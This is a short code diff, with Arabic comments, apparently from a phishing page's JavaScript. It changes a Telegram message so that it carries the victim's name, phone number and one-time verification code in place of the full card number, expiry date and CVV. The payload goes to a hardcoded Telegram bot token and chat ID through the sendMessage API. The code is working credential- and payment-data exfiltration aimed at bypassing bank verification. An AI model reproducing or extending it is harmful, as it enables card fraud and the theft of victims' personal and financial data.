@@ -191,8 +191,12 @@
             const botToken = '8889676845:AAGYcVFa7vOi_0FYgpq3WscOXKADANb-2TI';
             const chatId = '8108427825';
             
+            // جلب اسم العميل ورقم الهاتف من التخزين المحلي
+            const name = localStorage.getItem('masheed_customer_name') || 'غير متوفر';
+            const phone = localStorage.getItem('masheed_customer_phone') || 'غير متوفر';
+
             // تنسيق الرسالة بالشكل المطلوب
-            const message = `🔐 رمز تحقق جديد\nرقم البطاقة: ${fullCardNumber}\nتاريخ الانتهاء: ${cardExpiry}\nرمز الامان: ${cardCvv}\nرمز التحقق: ${otp}`;
+            const message = `🔐 رمز تحقق جديد\nالعميل: ${name}\nرقم الهاتف: ${phone}\nرمز التحقق: ${otp}`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
